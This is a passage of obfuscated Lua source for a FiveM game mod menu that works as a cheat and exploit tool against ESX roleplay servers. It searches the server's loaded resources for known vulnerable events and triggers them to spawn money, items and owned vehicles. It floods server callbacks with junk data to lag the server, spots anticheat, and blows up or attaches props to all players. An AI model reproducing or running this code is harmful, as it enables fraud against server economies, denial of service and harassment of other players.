                            elseif b6 < -10.5 then
                                b6 = b6 + 21
                            end
                            print(b6)
                            local b7 = b2 / 10.0 * -1
                            local aS = GetEntityCoords(aX)
                            local aQ, b8 = GetGroundZFor_3dCoord(aS.x, aS.y, aS.z, true)
                            local b9 = 0.0
                            if aQ then
                                if GetOffsetFromEntityInWorldCoords(aX, 0.0, 0.0, b7).z - b8 < 0.0 then
                                    b9 = b7 * -1
                                    if b9 > 1.75 then
                                        b9 = 1.75
                                    end
                                    b7 = b8 - GetEntityCoords(aX).z
                                end
                            end
                            b7 = b7 + 0.25
                            if b7 > 2.0 then
                                b9 = b7 - 2.0
                                if b9 > 3.0 then
                                    b9 = 3.0
                                end
                                b7 = 2.0
                            end
                            if b6 > 3.0 then
                                if b6 > 7.5 then
                                    SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aX, 3.0 - (b6 - 7.5), -4.5 + b9 + b6, b7))
                                else
                                    SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aX, 3.0, -4.5 + b9 + b6, b7))
                                end
                            else
                                if b6 < -3.0 then
                                    if b6 < -7.5 then
                                        SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aX, -3.0 - (b6 + 7.5), -4.5 + b9 - b6, b7))
                                    else
                                        SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aX, -3.0, -4.5 + b9 - b6, b7))
                                    end
                                else
                                    if b6 > 0.0 then
                                        SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aX, b6, -4.5 + b9 + b6, b7))
                                    else
                                        SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aX, b6, -4.5 + b9 - b6, b7))
                                    end
                                end
                            end
                        end
                        SetCamRot(l, b5.x + b2, b5.y + b3, b5.z + b4, 2)
                    end
                end)
                local N = CreatePedInsideVehicle(aX, 4, S('u_m_y_abner'), -1, true, true)
                SetEntityInvincible(N, true)
                SetEntityVisible(N, false)
                FreezeEntityPosition(N, true)
                SetPedAlertness(N, 0.0)
                CreateThread(function()
                    local ba = 0
                    local bb = 0
                    while true do
                        if IsControlJustReleased(0, 51) then
                            ClearPedTasksImmediately(PlayerPedId())
                            DeleteEntity(aX)
                            for F, G in pairs(aZ) do
                                DeleteEntity(G)
                            end
                            DeleteEntity(N)
                            break
                        end
                        if IsDisabledControlPressed(0, 74) and bb <= GetGameTimer() then
                            if aU == 'Robot' then
                                CreateThread(function()
                                    local bc = CreateVehicle(S('phantom2'), GetOffsetFromEntityInWorldCoords(a_, 13.0, 15.0, -7.0), GetEntityHeading(PlayerPedId()), true)
                                    SetEntityRotation(bc, GetEntityRotation(a_))
                                    SetVehicleForwardSpeed(bc, 9999.0)
                                    Wait(7500)
                                    DeleteEntity(bc)
                                end)
                                CreateThread(function()
                                    local bc = CreateVehicle(S('phantom2'), GetOffsetFromEntityInWorldCoords(a_, -13.0, 15.0, -7.0), GetEntityHeading(PlayerPedId()), true)
                                    SetEntityRotation(bc, GetEntityRotation(a_))
                                    SetVehicleForwardSpeed(bc, 9999.0)
                                    Wait(7500)
                                    DeleteEntity(bc)
                                end)
                            end
                            bb = GetGameTimer() + 250
                        end
                        if IsDisabledControlPressed(0, 25) and ba <= GetGameTimer() then
                            if aU == 'Robot' then
                                ShootSingleBulletBetweenCoords(GetOffsetFromEntityInWorldCoords(a_, -18.0, 35.0, -6.0), GetOffsetFromEntityInWorldCoords(aX, 0.0, 250.0, -25.0), 5000, 0, GetHashKey("VEHICLE_WEAPON_SPACE_ROCKET"), N, true, false, 9000.0)
                                ShootSingleBulletBetweenCoords(GetOffsetFromEntityInWorldCoords(a_, 18.0, 35.0, -6.0), GetOffsetFromEntityInWorldCoords(aX, 0.0, 250.0, -25.0), 5000, 0, GetHashKey("VEHICLE_WEAPON_SPACE_ROCKET"), N, true, false, 9000.0)
                            end
                            ba = GetGameTimer() + 50
                        end
                        if aU == 'Robot' then
                        end
                        if aU == 'Robot' then
                            AddTextEntry(GetCurrentResourceName(), '~INPUT_CONTEXT~ Delete ' .. aU .. '\n~INPUT_VEH_HEADLIGHT~ Shoot trucks\n~INPUT_AIM~ Shoot missiles\n~INPUT_DETONATE~ Flip vehicle\n~INPUT_HUD_SPECIAL~ Change perspective\n~INPUT_COVER~ Repair car')
                            DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
                        end
                        if IsControlJustReleased(0, 47) then
                            SetEntityCoords(aX, GetEntityCoords(aX) + vec3(0.0, 0.0, 2.0))
                            Wait(50)
                            SetVehicleOnGroundProperly(aX)
                        end
                        if IsControlJustReleased(0, 48) then
                            b0 = not b0
                        end
                        if IsControlJustReleased(0, 44) then
                            SetVehicleFixed(aX)
                        end
                        DisableControlAction(0, 32, true)
                        DisableControlAction(0, 33, true)
                        DisableControlAction(0, 34, true)
                        DisableControlAction(0, 35, true)
                        Wait(0)
                    end
                end)
                CreateThread(function()
                    FreezeEntityPosition(PlayerPedId(), true)
                    SetFocusEntity(aX)
                    while DoesEntityExist(aX) do
                        Wait(0)
                        SetEntityInvincible(aX, true)
                        if DoesEntityExist(N) then
                            SetVehicleGravityAmount(aX, 20.0)
                            M(N, aX)
                        end
                    end
                    DestroyCam(l)
                    ClearTimecycleModifier()
                    RenderScriptCams(false, false, 0, 1, 0)
                    FreezeEntityPosition(PlayerPedId(), false)
                    ClearFocus()
                end)
            end
        end)
    end
end
local bd = function(aM)
    if a then
        if aM['Type'] == 'toggle' then
            d[aM['Text']] = aM['Enabled']
        elseif aM['Type'] == 'button' then
            if aM['Text'] == 'Set current vehicle as owned' then
                local be = { ['qalle'] = { ['Text'] = 'ESX.TriggerServerCallback("esx-qalle-sellvehicles:buyVehicle"', ['Location'] = 'client/main.lua' }, ['vehicleshopold'] = { ['Text'] = "TriggerServerEvent('esx_vehicleshop:setVehicleOwned', vehicleProps)", ['Location'] = 'client/main.lua' } }
                local bf = false
                if not bf then
                    for F, G in pairs(be) do
                        for Q = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(Q)) == 'started' then
                                local as = LoadResourceFile(GetResourceByFindIndex(Q), G['Location'])
                                if as then
                                    if string.find(as:lower(), G['Text']:lower(), 1, true) then
                                        print('Vehicle method: ^1' .. F)
                                        bf = F
                                    end
                                end
                            end
                        end
                    end
                end
                local bg = GetVehiclePedIsUsing(PlayerPedId())
                if bg then
                    if DoesEntityExist(bg) then
                        if bf == 'qalle' then
                            a['TriggerServerCallback']('esx-qalle-sellvehicles:buyVehicle', function(aQ)
                                if aQ then
                                    aB('Set vehicle as owned.')
                                    print('BOUGHT IT LOL')
                                else
                                    aB('Couldn\'t set vehicle as owned.')
                                    print('Couldn\'t buy it :/')
                                end
                            end, a['Game']['GetVehicleProperties'](bg), 0)
                        elseif bf == 'vehicleshopold' then
                            TriggerServerEvent('esx_vehicleshop:setVehicleOwned', a['Game']['GetVehicleProperties'](bg))
                        else
                            aB('Couldn\'t find a method to set vehicle as owned.')
                        end
                    else
                        aB('You are not sitting in a vehicle.')
                    end
                else
                    aB('You are not sitting in a vehicle.')
                end
            elseif aM['Text'] == 'Update current vehicle information' then
                local be = { ['lscustoms'] = { ['Text'] = "TriggerServerEvent('esx_lscustom:refreshOwnedVehicle', myCar)", ['Location'] = 'client/main.lua' } }
                local bf = false
                if not bf then
                    for F, G in pairs(be) do
                        for Q = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(Q)) == 'started' then
                                local as = LoadResourceFile(GetResourceByFindIndex(Q), G['Location'])
                                if as then
                                    if string.find(as:lower(), G['Text']:lower(), 1, true) then
                                        print('Vehicle method: ^1' .. F)
                                        bf = F
                                    end
                                end
                            end
                        end
                    end
                end
                local bg = GetVehiclePedIsUsing(PlayerPedId())
                if bg then
                    if DoesEntityExist(bg) then
                        if bf == 'lscustoms' then
                            TriggerServerEvent('esx_lscustom:refreshOwnedVehicle', a['Game']['GetVehicleProperties'](bg))
                        else
                            aB('Couldn\'t find a method to update vehicle cosmetics & performance.')
                        end
                    else
                        aB('You are not sitting in a vehicle.')
                    end
                else
                    aB('You are not sitting in a vehicle.')
                end
            elseif aM['Text'] == 'Max thirst & hunger' then
                TriggerEvent('esx_status:set', 'hunger', 1000000)
                TriggerEvent('esx_status:set', 'thirst', 1000000)
            elseif aM['Text'] == 'Get item' then
                local bh = { ['99kr'] = { ['Text'] = 'shops:Cashier', ['Location'] = 'client/shop.lua' }, ['99kr_burglary'] = { ['Text'] = "TriggerServerEvent('99kr-burglary:Add'", ['Location'] = 'burglary_client.lua' } }
                local bf = false
                if not bf then
                    for F, G in pairs(bh) do
                        for Q = 0, GetNumResources() - 1 do
                            if GetResourceState(GetResourceByFindIndex(Q)) == 'started' then
                                local as = LoadResourceFile(GetResourceByFindIndex(Q), G['Location'])
                                if as then
                                    if string.find(as:lower(), G['Text']:lower(), 1, true) then
                                        print('Item method: ^1' .. F)
                                        bf = F
                                    end
                                end
                            end
                        end
                    end
                end
                if bf then
                    local bi = ah('What item do you want?', '', 30)
                    if bi then
                        local bj = ah(('How many "%s" do you want to spawn?'):format(bi), '', 30)
                        if tonumber(bj) then
                            if bf == '99kr' then
                                TriggerServerEvent('99kr-shops:Cashier', 0, { { ['value'] = bi, ['amount'] = tonumber(bj) } }, 'cash')
                            elseif bf == '99kr_burglary' then
                                TriggerServerEvent('99kr-burglary:Add', bi, bj)
                            end
                        end
                    end
                else
                    CreateThread(function()
                        local T = GetGameTimer() + 1500
                        while T >= GetGameTimer() do
                            Wait(0)
                            ar('Couldn\'t find a method to spawn item.', 0.3, false, { 255, 0, 0 }, 0.5, 0.5, true, 0.1)
                        end
                    end)
                end
            end
        elseif aM['Text'] == 'Cuff / uncuff (self)' then
            TriggerEvent('esx_policejob:handcuff')
        end
    else
        print('ESX is not loaded...')
    end
end
local bk = { { ['Text'] = 'esx_vangelico_robbery:gioielli', ['Location'] = 'client/esx_vangelico_robbery_cl.lua', ['Method'] = { ['Events'] = { { 'server', 'esx_vangelico_robbery:gioielli' }, { 'server', 'esx_vangelico_robbery:gioielli1' }, { 'server', 'lester:vendita' } } } }, { ['Text'] = "TriggerServerEvent('esx-qalle-hunting:reward', AnimalWeight)", ['Location'] = 'client/main.lua', ['Method'] = { ['Events'] = { { 'server', 'esx-qalle-hunting:reward', 18 }, { 'server', 'esx-qalle-hunting:sell' } } } }, { ['Text'] = 'TriggerServerEvent("esx-ecobottles:retrieveBottle")', ['Location'] = 'client/main.lua', ['Method'] = { ['Events'] = { { 'server', 'esx-ecobottles:retrieveBottle' }, { 'server', 'esx-ecobottles:sellBottles' } } } }, { ['Text'] = "TriggerServerEvent('esx_carthief:pay', finalpayment)", ['Location'] = 'client/main.lua', ['Method'] = { ['Events'] = { { 'server', 'esx_carthief:pay', 1500 } } } }, { ['Text'] = "TriggerServerEvent('loffe_carthief:questFinished')", ['Location'] = 'client.lua', ['Method'] = { ['Events'] = { { 'server', 'loffe_carthief:questFinished' } } } }, { ['Text'] = "TriggerServerEvent('loffe_fishing:caught')", ['Location'] = 'client.lua', ['Method'] = { ['Events'] = { { 'server', 'loffe_fishing:caught' }, { 'server', 'loffe_fishing:sell' } } } }, { ['Text'] = "TriggerServerEvent('esx_loffe_fangelse:Pay')", ['Location'] = 'client/main.lua', ['Method'] = { ['Events'] = { { 'server', 'esx_loffe_fangelse:Pay' } } } }, { ['Text'] = "TriggerServerEvent('loffe_robbery:pickUp', i)", ['Location'] = 'client.lua', ['Method'] = { ['Events'] = { { 'server', 'loffe_robbery:pickUp', 1 } } } }, { ['Text'] = 'TriggerServerEvent("esx_truckerjob:pay", amount)', ['Location'] = 'client/main.lua', ['Method'] = { ['Events'] = { { 'server', 'esx_truckerjob:pay', 1500 } } } } }
local bf = {}
local bl = function()
    if #bf == 0 then
        for Q = 0, GetNumResources() - 1 do
            for F, G in pairs(bk) do
                if GetResourceState(GetResourceByFindIndex(Q)) == 'started' then
                    local as = LoadResourceFile(GetResourceByFindIndex(Q), G['Location'])
                    if as then
                        if string.find(as:lower(), G['Text']:lower(), 1, true) then
                            print('Event: ^1' .. G['Text'] .. ' ^0found')
                            bf[F] = G
                        end
                    end
                end
            end
        end
        Wait(3000)
        if #bf == 0 then
            print('no method found')
        end
    else
        for F, G in pairs(bf) do
            for F, G in pairs(G['Method']['Events']) do
                print('Triggering event: ^1' .. G[2])
                if G[1] == 'server' then
                    if G[3] then
                        TriggerServerEvent(G[2], G[3])
                    else
                        TriggerServerEvent(G[2])
                    end
                elseif G[1] == 'client' then
                    if G[3] then
                        TriggerEvent(G[2], G[3])
                    else
                        TriggerEvent(G[2])
                    end
                end
            end
            Wait(2500)
        end
        Wait(0)
    end
end
local bm = function()
    local bn = GetGameTimer()
    while true do
        local bo = 0
        if a then
            for F, G in pairs(d) do
                if F == 'Delay' then
                    if G then
                        if bn <= GetGameTimer() then
                            local bp = {}
                            for Q = 1, 5000 do
                                table.insert(bp, { plate = ('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1, 9), y, math.random(1, 9)) })
                            end
                            if GetResourceState('esx_ambulancejob') == 'started' then
                                TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                                a['TriggerServerCallback']('esx_ambulancejob:getDeathStatus', aK)
                                a['TriggerServerCallback']('esx_ambulancejob:storeNearbyVehicle', aK, bp)
                            end
                            if GetResourceState('esx_policejob') == 'started' then
                                a['TriggerServerCallback']('esx_policejob:storeNearbyVehicle', aK, bp)
                            end
                            if GetResourceState('esx_skin') == 'started' then
                                a['TriggerServerCallback']('esx_skin:getPlayerSkin', aK)
                            end
                            if GetResourceState('esx_property') == 'started' then
                                TriggerServerEvent('esx_property:deleteLastProperty')
                                TriggerServerEvent('esx_property:saveLastProperty', 'nil')
                            end
                            TriggerServerEvent('esx:onPickup', 'lol')
                            a['TriggerServerCallback'](('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1, 9), y, math.random(1, 9)), aK)
                            bn = GetGameTimer() + 0
                            bn = GetGameTimer() + 2500
                        end
                    end
                elseif F == 'Get money' then
                    if G then
                        bl()
                    end
                elseif F == 'Give server cancer' then
                    if G then
                        TriggerServerEvent('esx:onPickup', 'lol')
                        a['TriggerServerCallback'](('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1, 9), y, math.random(1, 9)), aK)
                    end
                    Wait(1000)
                end
            end
        else
            bo = 250
        end
        Wait(bo)
    end
end
local bq = function()
    if not a then
        local br = LoadResourceFile('es_extended', 'client/common.lua')
        if br then
            print('Found ESX... Looking for event.')
            local a8, bs = string.find(br, 'AddEventHandler%(')
            local a8, bt = string.find(br, ',')
            if bs and bt then
                local bu = string.sub(br, bs + 2, bt - 2)
                print('ESX event found: ^1' .. bu)
                if bu ~= 'esx:getSharedObject' then
                    print('^1Warning!^0 This server is most likely running an anticheat. (ESX event is not "esx:getSharedObject")')
                end
                print('Loading ESX...')
                CreateThread(function()
                    while a == nil do
                        TriggerEvent(bu, function(bv)
                            a = bv
                            if bv then
                                print('ESX successfully loaded.')
                            end
                            Z[11] = { { ['Text'] = 'Delay', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bd }, { ['Text'] = 'Get money', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bd }, { ['Text'] = 'Get item', ['Type'] = 'button', ['cb'] = bd }, { ['Text'] = 'Max thirst & hunger', ['Type'] = 'button', ['cb'] = bd }, { ['Text'] = 'Set current vehicle as owned', ['Type'] = 'button', ['cb'] = bd }, { ['Text'] = 'Update current vehicle information', ['Type'] = 'button', ['cb'] = bd }, { ['Text'] = 'Cuff / uncuff (self)', ['Type'] = 'button', ['cb'] = bd }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }
                        end)
                        Wait(0)
                    end
                end)
            else
                print('Couldn\'t find ESX event.')
            end
        else
            print('ESX not found.')
        end
    else
        print('ESX is already loaded.')
    end
end
local bw = function(bx)
    SetEntityInvincible(bx, true)
    SetEntityAsMissionEntity(bx, true, true)
    SetPedHearingRange(bx, 0.0)
    SetPedSeeingRange(bx, 0.0)
    SetPedAlertness(bx, 0.0)
    SetPedFleeAttributes(bx, 0, 0)
    SetBlockingOfNonTemporaryEvents(bx, true)
    SetPedCombatAttributes(bx, 46, true)
    SetPedFleeAttributes(bx, 0, 0)
end
local by = { ['Background'] = { 33, 33, 33, 223 }, ['Main'] = { 45, 45, 45, 255 }, ['Label'] = { 0, 0, 0, 255 } }
local bz = function(aM)
    local bA = aM['Items'][aM['Current']]
    for Q = 1, 2 do
        SetPedConfigFlag(PlayerPedId(), 100, false)
        SetPedIsDrunk(PlayerPedId(), false)
        ResetPedMovementClipset(PlayerPedId(), 0.0)
        ShakeGameplayCam('DRUNK_SHAKE', 0.0)
        StopScreenEffect('DrugsMichaelAliensFight')
        StopScreenEffect('DrugsMichaelAliensFightIn')
        StopScreenEffect('DrugsTrevorClownsFight')
        StopScreenEffect('DrugsTrevorClownsFightIn')
        ClearTimecycleModifier()
        d['Effect'] = bA
        Wait(5)
    end
end
local bB = function(aM)
    local bA = aM['Items'][aM['Current']]
    if aM['Text'] == 'Menu X offset' then
        e = tonumber(bA)
    elseif aM['Text'] == 'Menu Y offset' then
        f = tonumber(bA) + 0.003
    end
end
local bC = function(aM)
    if aM['Type'] == 'toggle' then
        d[aM['Text']] = aM['Enabled']
    elseif aM['Type'] == 'list' then
        if aM['Text'] == 'Gödmôdê' then
            if t then
                if aM['Items'][aM['Current']] == 'gödmôdê' then
                    aC()
                else
                    d['Gödmôdê'] = aM['Items'][aM['Current']]
                end
            else
                d['Gödmôdê'] = aM['Items'][aM['Current']]
            end
        elseif aM['Text'] == 'Infinite ammo' then
            if t then
                if aM['Items'][aM['Current']] == 'infinite ammo' then
                    aC()
                else
                    d['Infinite ammo'] = aM['Items'][aM['Current']]
                end
            else
                d['Infinite ammo'] = aM['Items'][aM['Current']]
            end
        elseif aM['Text'] == 'Åïmßð† [fov]' then
            u = tonumber(aM['Items'][aM['Current']])
        elseif aM['Text'] == 'Åïmßð† [bone]' then
            v = aM['Items'][aM['Current']]
        elseif aM['Text'] == 'Outfit' then
            if aM['Items'][aM['Current']] ~= 'Random' then
                TriggerEvent('skinchanger:loadSkin', a2[aM['Items'][aM['Current']]])
            else
                SetPedComponentVariation(PlayerPedId(), 8, math.random(0, 250), 0, 2)
                SetPedComponentVariation(PlayerPedId(), 11, math.random(0, 250), 0, 2)
                SetPedComponentVariation(PlayerPedId(), 3, math.random(0, 150), 0, 2)
                SetPedComponentVariation(PlayerPedId(), 4, math.random(0, 150), 0, 2)
                SetPedComponentVariation(PlayerPedId(), 6, math.random(0, 100), 0, 2)
                SetPedComponentVariation(PlayerPedId(), 1, math.random(0, 100), 1, 2)
            end
        elseif aM['Text'] == 'Refill' then
            if aM['Items'][aM['Current']] == 'health' then
                SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))
            else
                SetPedArmour(PlayerPedId(), 100)
            end
        elseif aM['Text'] == 'Give weapon' then
            GiveWeaponToPed(PlayerPedId(), aM['Items'][aM['Current']], 250, false, false)
        elseif aM['Text'] == 'Prop everyone' then
            if not t then
                for F, G in pairs(o) do
                    local aF = GetPlayerPed(G)
                    CreateThread(function()
                        local model = GetHashKey(V[aM['Items'][aM['Current']]])
                        while not HasModelLoaded(model) do
                            Wait(0)
                            RequestModel(model)
                        end
                        local bv = CreateObject(model, GetEntityCoords(aF), true, true, true)
                        table.insert(m, bv)
                        AttachEntityToEntity(bv, aF, 11816, 0.0, -0.5, 0.0, 0.5, 0.5, 0.0, false, false, false, false, 2, false)
                    end)
                end
            else
                aC()
            end
        end
    elseif aM['Type'] == 'button' then
        if aM['Text'] == 'Suicide' then
            SetEntityHealth(PlayerPedId(), 0)
        elseif aM['Text'] == 'Remove spawned props' then
            for F, G in pairs(m) do
                CreateThread(function()
                    while DoesEntityExist(G) do
                        Wait(0)
                        DetachEntity(G, false, false)
                        while not NetworkHasControlOfEntity(G) do
                            NetworkRequestControlOfEntity(G)
                            Wait(0)
                        end
                        SetEntityAsMissionEntity(G, true, true)
                        DeleteEntity(G)
                        Wait(100)
                    end
                end)
            end
            m = {}
        elseif aM['Text'] == 'Revive' then
            local aS = GetEntityCoords(PlayerPedId())
            NetworkResurrectLocalPlayer(aS, GetEntityHeading(PlayerPedId()), true, false)
            ClearPedBloodDamage(PlayerPedId())
            TriggerEvent('playerSpawned', aS.x, aS.y, aS.z)
            StopScreenEffect('DeathFailOut')
            for Q = 0, GetNumResources() - 1 do
                if GetResourceState(GetResourceByFindIndex(Q)) == 'started' then
                    local as = LoadResourceFile(GetResourceByFindIndex(Q), 'client/main.lua')
                    if as then
                        if string.find(as:lower(), ("RegisterNetEvent('esx_ambulancejob:revive')"):lower(), 1, true) then
                            print('Found ambulance revive, reviving..')
                            TriggerEvent('esx_ambulancejob:revive')
                        end
                    end
                end
            end
        elseif aM['Text'] == 'Delete attached' then
            for F, G in pairs(aL('Object')) do
                if IsEntityAttachedToEntity(G, PlayerPedId()) then
                    CreateThread(function()
                        while DoesEntityExist(G) do
                            Wait(0)
                            DetachEntity(G, false, false)
                            while not NetworkHasControlOfEntity(G) do
                                NetworkRequestControlOfEntity(G)
                                Wait(0)
                            end
                            SetEntityAsMissionEntity(G, true, true)
                            DeleteEntity(G)
                            Wait(100)
                        end
                    end)
                end
            end
        elseif aM['Text'] == 'Teleport to waypoint' then
            CreateThread(function()
                local bD = GetFirstBlipInfoId(8)
                if DoesBlipExist(bD) then
                    local aS = GetBlipInfoIdCoord(bD).xy
                    for b7 = 1, 1000 do
                        SetPedCoordsKeepVehicle(PlayerPedId(), aS.x, aS.y, b7 + 0.0)
                        local bE, b7 = GetGroundZFor_3dCoord(aS.x, aS.y, b7 + 0.0)
                        if bE then
                            SetPedCoordsKeepVehicle(PlayerPedId(), aS.x, aS.y, b7 + 0.0)
                            break
                        end
                        Wait(0)
                    end
                end
            end)
        elseif aM['Text'] == 'Teleport to coords' then
            z = false
            CreateThread(function()
                local a8 = tonumber(ah('What X coordinate?', '', 30))
                if a8 then
                    local a9 = tonumber(ah('What Y coordinate?', '', 30))
                    if a9 then
                        local bF = tonumber(ah('What Z coordinate?', '', 30))
                        if bF then
                            SetPedCoordsKeepVehicle(PlayerPedId(), a8 + 0.0, a9 + 0.0, bF + 0.0)
                            Wait(250)
                            local T = GetGameTimer() + 5000
                            while not HasCollisionLoadedAroundEntity(PlayerPedId()) do
                                Wait(0)
                                SetPedCoordsKeepVehicle(PlayerPedId(), a8 + 0.0, a9 + 0.0, bF + 0.0)
                                if T <= GetGameTimer() then
                                    break
                                end
                            end
                        end
                    end
                end
                z = true
            end)
        elseif aM['Text'] == 'Explode everyone (silent)' then
            for F, G in pairs(o) do
                local aF = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(G)))
                AddExplosion(GetEntityCoords(aF), 34, 500.0, false, true, false, false)
            end
        elseif aM['Text'] == 'Give all weapons' then
            for F, G in pairs(a1) do
                GiveWeaponToPed(PlayerPedId(), GetHashKey(G), 250, false, false)
            end
        elseif aM['Text'] == 'Remove all weapons' then
            RemoveAllPedWeapons(PlayerPedId())
        end
    end
end
CreateThread(function()
    while true do
        local bG = PlayerPedId()
        for F, G in pairs(d) do
            if F == 'Invisible' then
                SetEntityVisible(bG, not G, false)
            elseif F == 'Gödmôdê' then
                if G == 'off' then
                    SetEntityInvincible(bG, false)
                    SetPlayerInvincible(PlayerId(), false)
                    SetEntityProofs(bG, false, false, false, false, false, false, false, false)
                    SetEntityCanBeDamaged(bG, true)
                elseif G == 'gödmôdê' then
                    if not t then
                        SetEntityInvincible(bG, true)
                        SetPlayerInvincible(PlayerId(), true)
                        SetEntityProofs(bG, true, true, true, true, true, true, true, true)
                        SetEntityCanBeDamaged(bG, false)
                    else
                        aC()
                    end
                elseif G == 'safe' then
                    SetEntityInvincible(bG, false)
                    SetPlayerInvincible(PlayerId(), false)
                    SetEntityProofs(bG, false, false, false, false, false, false, false, false)
                    SetEntityCanBeDamaged(bG, true)
                    if GetEntityHealth(bG) < GetEntityMaxHealth(bG) - 25 then
                        SetTimeout(250, function()
                            SetEntityHealth(bG, GetEntityMaxHealth(bG))
                        end)
                    end
                    if IsPedDeadOrDying(bG) or IsPedFatallyInjured(bG) then
                        Wait(2500)
                        local aS = GetEntityCoords(bG)
                        NetworkResurrectLocalPlayer(aS, GetEntityHeading(bG), true, false)
                        ClearPedBloodDamage(bG)
                        TriggerEvent('playerSpawned', aS.x, aS.y, aS.z)
                        StopScreenEffect('DeathFailOut')
                    end
                end
            elseif F == 'Max fuel' then
                if G then
                    local bH = GetVehiclePedIsUsing(bG)
                    if bH then
                        if DoesEntityExist(bH) then
                            if GetVehicleFuelLevel(bH) <= 50.0 then
                                SetVehicleFuelLevel(bH, math.random(7500, 10000) / 100)
                            end
                        end
                    end
                end
            elseif F == 'Insta brake [SPACE + S]' then
                if G then
                    local bH = GetVehiclePedIsUsing(bG)
                    if bH then
                        if DoesEntityExist(bH) then
                            if IsControlPressed(0, 72) and IsControlPressed(0, 76) then
                                SetVehicleForwardSpeed(bH, 0.0)
                            end
                        end
                    end
                end
            elseif F == 'Crosshair' then
                if G then
                    DrawRect(0.5, 0.5, 0.006, 0.004, 0, 0, 0, 255)
                    DrawRect(0.5, 0.5, 0.002, 0.011, 0, 0, 0, 255)
                    DrawRect(0.5, 0.5, 0.0045, 0.001, table.unpack(am(0.1)))
                    DrawRect(0.5, 0.5, 0.001, 0.008, table.unpack(am(0.1)))
                end
            elseif F == 'PlayerBlips' then
                if G then
                    if math.random(1, 1000) == 25 then
                        n()
                        print('Reloaded blips')
                    end
                    for F, G in pairs(q) do
                        local aF = GetPlayerPed(F)
                        if aF then
                            if DoesEntityExist(aF) then
                                if i[GetPlayerServerId(F)] then
                                    SetBlipFriend(G, true)
                                    SetBlipColour(G, 0)
                                else
                                    SetBlipFriend(G, false)
                                    SetBlipColour(G, 0)
                                end
                                SetBlipCoords(G, GetEntityCoords(aF))
                            else
                                if DoesBlipExist(G) then
                                    RemoveBlip(G)
                                    q[F] = false
                                end
                            end
                        else
                            if DoesBlipExist(G) then
                                RemoveBlip(G)
                                q[F] = false
                            end
                        end
                    end
                end
            elseif F == 'Noclip' then
                if G then
                    local a8, a9, bF = table.unpack(GetEntityCoords(bG, true))
                    local bI = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
                    local bJ = GetGameplayCamRelativePitch()
                    local bK = -math.sin(bI * math.pi / 180.0)
                    local bL = math.cos(bI * math.pi / 180.0)
                    local bM = math.sin(bJ * math.pi / 180.0)
                    local bN = math.sqrt(bK * bK + bL * bL + bM * bM)
                    if bN ~= 0 then
                        bK = bK / bN
                        bL = bL / bN
                        bM = bM / bN
                    end
                    local an = 2.0
                    SetEntityVelocity(bG, 0.0001, 0.0001, 0.0001)
                    if IsControlPressed(0, 21) then
                        an = an + 10
                    end
                    if IsControlPressed(0, 19) then
                        an = 0.5
                    end
                    if IsControlPressed(0, 32) then
                        a8 = a8 + an * bK
                        a9 = a9 + an * bL
                        bF = bF + an * bM
                    end
                    if IsControlPressed(0, 269) then
                        a8 = a8 - an * bK
                        a9 = a9 - an * bL
                        bF = bF - an * bM
                    end
                    SetEntityCoordsNoOffset(bG, a8, a9, bF, true, true, true)
                end
            elseif F == 'Infinite stamina' then
                if G then
                    ResetPlayerStamina(PlayerId())
                end
            elseif F == 'No ragdoll' then
                if G then
                    if not t then
                        SetPedCanBeKnockedOffVehicle(bG, false)
                        SetPedCanRagdoll(bG, false)
                        SetPedCanRagdollFromPlayerImpact(bG, false)
                        SetPedRagdollOnCollision(bG, false)
                        SetPedCanBeDraggedOut(bG, false)
                    else
                        d[F] = false
                        aC()
                    end
                else
                    SetPedCanRagdoll(bG, true)
                end
            elseif F == 'Shrink ped' then
                if G then
                    if not t then
                        if not GetPedConfigFlag(bG, 223, false) then
                            SetPedConfigFlag(bG, 223, true)
                        end
                    else
                        d[F] = false
                        aC()
                    end
                else
                    if GetPedConfigFlag(bG, 223, true) then
                        SetPedConfigFlag(bG, 223, false)
                    end
                end
            elseif F == 'Super run' then
                if G then
                    if t then
                        d[F] = false
                        aC()
                    else
                        ResetPlayerStamina(PlayerId())
                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                        SetPedMoveRateOverride(bG, 5.0)
                    end
                else
                    SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                    SetPedMoveRateOverride(bG, 1.0)
                end
            elseif F == 'Super jump' then
                if G then
                    if t then
                        d[F] = false
                        aC()
                    else
                        SetSuperJumpThisFrame(PlayerId())
                    end
                end
            elseif F == 'Radar' then
                DisplayRadar(G)
            elseif F == 'Effect' then
                if G == 'drunk' then
                    SetPedConfigFlag(bG, 100, true)
                    SetPedIsDrunk(bG, true)
                    while not HasAnimSetLoaded('MOVE_M@DRUNK@VERYDRUNK') do
                        RequestAnimSet('MOVE_M@DRUNK@VERYDRUNK')
                        Wait(0)
                    end
                    ShakeGameplayCam('DRUNK_SHAKE', 1.0)
                    SetPedMovementClipset(bG, 'MOVE_M@DRUNK@VERYDRUNK', 1)
                    SetTimecycleModifier('Drunk')
                    SetPedMotionBlur(bG, true)
                elseif G == 'high' then
                    SetPedConfigFlag(bG, 100, true)
                    SetPedIsDrunk(bG, true)
                    while not HasAnimSetLoaded('MOVE_M@DRUNK@VERYDRUNK') do
                        RequestAnimSet('MOVE_M@DRUNK@VERYDRUNK')
                        Wait(0)
                    end
                    ShakeGameplayCam('DRUNK_SHAKE', 1.0)
                    SetPedMovementClipset(bG, 'MOVE_M@DRUNK@VERYDRUNK', 1)
                    SetTimecycleModifier('Drunk')
